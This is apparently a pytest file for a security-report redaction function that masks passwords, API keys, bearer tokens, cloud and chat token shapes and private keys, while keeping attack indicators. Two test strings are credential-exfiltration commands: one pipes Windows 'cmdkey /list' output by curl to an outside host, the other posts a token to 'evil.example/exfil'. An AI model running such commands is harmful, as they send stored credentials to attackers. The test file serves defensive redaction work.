"""redact() masks credential values and known token shapes but must leave attack indicators
(hostnames, URLs, command structure) intact so the report still carries its evidence."""

from alibi.redact import MASK, redact


def test_keyed_secrets_masked():
    assert redact("password=hunter2") == f"password={MASK}"
    assert redact("api_key: 'abc123XYZ'") == f"api_key: '{MASK}'"
    assert redact("client_secret = s3cr3tVALUE") == f"client_secret = {MASK}"
    assert redact("X-Auth-Token: abcDEF123") == f"X-Auth-Token: {MASK}"


def test_url_credentials_masked_host_preserved():
    out = redact("https://admin:p4ssw0rd@internal.example.com/db")
    assert out == f"https://admin:{MASK}@internal.example.com/db"
    assert "internal.example.com" in out


def test_auth_and_bearer_tokens_masked():
    assert redact("Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.payload.sig") == f"Authorization: Bearer {MASK}"
    assert redact("sent Bearer abcdefgh12345678") == f"sent Bearer {MASK}"


def test_fixed_shape_tokens_masked():
    assert redact("key AKIAIOSFODNN7EXAMPLE here") == f"key {MASK} here"
    assert redact("ghp_" + "a" * 36) == MASK
    assert redact("xoxb-123456789012-abcdef") == MASK


def test_private_key_block_masked():
    pem = "-----BEGIN RSA PRIVATE KEY-----\nMIIabc\nlines\n-----END RSA PRIVATE KEY-----"
    assert redact(pem) == MASK


def test_attack_indicators_preserved():
    cmd = "cmdkey /list | curl -s -X POST --data-binary @- http://telemetry-collect.dev/ingest"
    out = redact(cmd)
    assert out == cmd
    assert "telemetry-collect.dev" in out and MASK not in out


def test_secret_masked_but_host_kept_in_same_string():
    out = redact("curl -H 'token: SEKRET123' http://evil.example/exfil")
    assert MASK in out
    assert "evil.example" in out and "SEKRET123" not in out


def test_empty_and_clean_text():
    assert redact("") == ""
    assert redact("just a normal sentence") == "just a normal sentence"
